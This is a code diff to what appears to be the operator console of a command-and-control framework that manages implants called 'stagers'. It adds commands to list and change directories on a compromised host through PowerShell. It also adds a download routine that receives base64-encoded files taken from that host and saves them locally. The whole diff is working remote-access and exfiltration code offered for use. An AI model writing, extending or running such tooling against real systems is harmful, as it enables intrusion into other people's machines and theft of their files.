@@ -12,6 +12,8 @@ from localhttpserver import localhttpserver
 import win32pipe, win32file, pywintypes
 import codecs
 
+import decoder
+
 #from os.path import isfile, join
 
 import readline
@@ -380,6 +382,26 @@ class myserver():
                     myhistory.append("[Stager] Run Command result: {}".format(recv_result))
                     myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                     continue
+                
+                if cmd_struct_to_send[0] == "download":
+                    #next message is either data or error code
+                    recv_result = t_mysockethandler.get_nextmsg()
+                    if decoder.isBase64(recv_result):
+                        data_array = decoder.b64_decode(recv_result)
+                        fileanme = os.path.basename(cmd_struct_to_send[1]) # platform dependent
+                        myhistory.append("[Stager] Writing to {}".format(fileanme))
+                        with open(os.path.join("DLDB\\",fileanme),mode = "wb") as f:
+                            f.write(data_array)
+
+                    else:
+                        myhistory.append("[Stager] Something wrong with download data ... ")
+                    
+                    #ack in all cases
+                    encode_cmd = t_mysockethandler.msf_encode(self.__t_myconstant_networking.DL_SUCCESS).encode("utf8", "ignore")
+                    send_result = mysocket.send(encode_cmd)
+                    myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
+                    continue
+
 
                 # try get cmd result if any
                 recv_result = t_mysockethandler.get_nextmsg()
@@ -1342,6 +1364,58 @@ class mymainclass():
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.GETDOMAIN)
                     continue
 
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_LS:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+
+                    self.__t_myserver.create_command(user_input_stager,"ps","ls")
+                    continue
+
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_CD:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+                    
+                    removecomplete()
+                    user_input_path = input("Please enter the path: ")
+                    #print("Moving to {}".format(user_input_path))
+                    user_input_confirm = input("y to continue: ")
+                    if user_input_confirm != "y":
+                        continue
+
+                    self.__t_myserver.create_command(user_input_stager,"ps","cd {}".format(user_input_path))
+                    self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.NET_CD)
+                    continue
+                
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_DOWNLOAD:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+
+                    removecomplete()
+                    user_input_path = input("Please enter the full path: ")
+                    #print("Moving to {}".format(user_input_path))
+                    user_input_confirm = input("y to continue: ")
+                    if user_input_confirm != "y":
+                        continue
+
+                    self.__t_myserver.create_command(user_input_stager,"download",user_input_path)
+                    continue
+
+                    
 
             if cmd_tag == self.__t_myconstant.TAG_PIPE_LISTENER:
                 # menu switch
